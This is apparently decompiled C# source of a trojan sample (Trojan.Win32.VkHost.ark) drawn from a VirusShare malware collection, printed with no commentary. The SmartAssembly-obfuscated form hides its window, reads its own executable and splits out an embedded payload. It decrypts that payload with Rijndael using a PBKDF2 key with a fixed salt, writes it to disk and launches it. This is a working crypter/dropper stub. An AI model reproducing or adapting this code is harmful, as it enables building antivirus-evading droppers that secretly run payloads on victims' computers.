// Decompiled with JetBrains decompiler
// Type: .
// Assembly: itzsparta, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F0D3E75E-11A1-406D-AF2E-9B1491797EF1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.VkHost.ark-da14248739773b0b58027e74e83521cc3e669c1e939a3b2c3bc4f80f04601a9b.exe

using \u0001;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace \u0005
{
  internal class \u0001 : Form
  {
    private IContainer \u0001;
    private string \u0001;
    private string \u0002;

    public \u0001()
    {
      try
      {
        \u009B obj1 = \u009B.\u0008\u0006;
        \u0005.\u0001 obj2 = this;
        // ISSUE: virtual method pointer
        EventHandler eventHandler = new EventHandler((object) obj2, __vmethodptr(obj2, \u0002));
        obj1((object) this, eventHandler);
        this.\u0002 = \u009A\u0003.\u0017\u0005();
        this.\u0002();
      }
      catch (Exception ex)
      {
        throw UnhandledException.\u0002(ex, (object) this);
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose([In] bool obj0)
    {
      try
      {
        try
        {
          if (!obj0 || this.\u0001 == null)
            return;
          \u009C\u0002.\u007E\u0002\u0002((object) this.\u0001);
        }
        finally
        {
          \u0095.\u000F\u0006((object) this, obj0);
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) obj0;
        throw UnhandledException.\u0002(ex, (object) this, (object) local);
      }
    }

    private void \u0002()
    {
      SizeF sizeF1;
      Size size1;
      try
      {
        \u009C\u0002.\u007E\u0002\u0006((object) this);
        \u001B\u0003 obj1 = \u001B\u0003.\u007E\u0003\u0006;
        sizeF1 = new SizeF(6f, 13f);
        SizeF sizeF2 = sizeF1;
        obj1((object) this, sizeF2);
        \u000E\u0003.\u007E\u0004\u0006((object) this, AutoScaleMode.Font);
        \u000F\u0002 obj2 = \u000F\u0002.\u007E\u0006\u0006;
        size1 = new Size(284, 262);
        Size size2 = size1;
        obj2((object) this, size2);
        \u007F\u0003.\u007E\u009D\u0005((object) this, \u0003.\u0002(2945));
        \u007F\u0003.\u007E\u0007\u0006((object) this, \u0003.\u0002(2945));
        \u0095.\u007E\u0001\u0006((object) this, false);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<SizeF> local1 = (ValueType) sizeF1;
        // ISSUE: variable of a boxed type
        __Boxed<Size> local2 = (ValueType) size1;
        throw UnhandledException.\u0002(ex, (object) local1, (object) local2, (object) this);
      }
    }

    private void \u0002([In] object obj0, [In] EventArgs obj1)
    {
      int[] numArray1;
      string str1;
      string[] strArray;
      string str2;
      RijndaelManaged rijndaelManaged;
      byte[] numArray2;
      byte[] salt;
      string password;
      Rfc2898DeriveBytes rfc2898DeriveBytes;
      MemoryStream memoryStream;
      CryptoStream cryptoStream;
      byte[] numArray3;
      Exception exception;
      try
      {
        try
        {
          \u0095.\u007E\u009E\u0005((object) this, false);
          \u009C\u0002.\u007E\u009F\u0005((object) this);
          str1 = \u0003.\u0002(2954);
          password = \u0003.\u0002(2987);
          \u0092.\u001A(1, \u009A\u0003.\u0098\u0005(), OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
          this.\u0001 = \u008D\u0002.\u0083(checked ((int) \u0093\u0002.\u001E(1)));
          \u008A\u0002.\u001C(1, ref this.\u0001, -1L, false);
          numArray1 = new int[1]{ 1 };
          \u0001\u0004.\u001B(numArray1);
          strArray = \u0092\u0003.\u0084(this.\u0001, str1, -1, CompareMethod.Binary);
          str2 = strArray[1];
          rijndaelManaged = new RijndaelManaged();
          numArray2 = new byte[8]
          {
            (byte) 1,
            (byte) 2,
            (byte) 3,
            (byte) 4,
            (byte) 5,
            (byte) 6,
            (byte) 7,
            (byte) 8
          };
          salt = numArray2;
          rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt);
          \u0087\u0002.\u007E\u008D\u0005((object) rijndaelManaged, \u008E\u0002.\u007E\u0094\u0005((object) rfc2898DeriveBytes, \u0093\u0003.\u007E\u008C\u0005((object) rijndaelManaged).Length));
          \u0087\u0002.\u007E\u008B\u0005((object) rijndaelManaged, \u008E\u0002.\u007E\u0094\u0005((object) rfc2898DeriveBytes, \u0093\u0003.\u007E\u008A\u0005((object) rijndaelManaged).Length));
          memoryStream = new MemoryStream();
          cryptoStream = new CryptoStream((Stream) memoryStream, \u0092\u0002.\u007E\u008F\u0005((object) rijndaelManaged), CryptoStreamMode.Write);
          try
          {
            numArray3 = \u0091.\u009E\u0002(str2);
            \u0007\u0003.\u007E\u0088\u0005((object) cryptoStream, numArray3, 0, numArray3.Length);
            \u009C\u0002.\u007E\u0008\u0005((object) cryptoStream);
            str2 = \u009E\u0003.\u007E\u009B\u0004((object) \u009B\u0003.\u009D\u0004(), \u0093\u0003.\u007E\u0016\u0005((object) memoryStream));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0092.\u001A(1, \u0098\u0003.\u001B\u0002(this.\u0002, \u0003.\u0002(3129)), OpenMode.Binary, OpenAccess.Default, OpenShare.Default, -1);
          \u0013\u0003.\u001D(1, str2, -1L, false);
          numArray1 = new int[1]{ 1 };
          \u0001\u0004.\u001B(numArray1);
          int num = \u0095\u0002.\u0082(\u0098\u0003.\u001B\u0002(this.\u0002, \u0003.\u0002(3129)), AppWinStyle.NormalFocus, false, -1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception = ex;
          \u001C\u0003.\u0080();
        }
        \u009C\u0002.\u007E\u000E\u0006((object) this);
      }
      catch (Exception ex)
      {
        object[] objArray = new object[16]
        {
          (object) numArray3,
          (object) salt,
          (object) cryptoStream,
          (object) password,
          (object) memoryStream,
          (object) rijndaelManaged,
          (object) rfc2898DeriveBytes,
          (object) strArray,
          (object) str1,
          (object) str2,
          (object) exception,
          (object) numArray1,
          (object) numArray2,
          (object) this,
          obj0,
          (object) obj1
        };
        throw UnhandledException.\u0002(ex, objArray);
      }
    }
  }
}
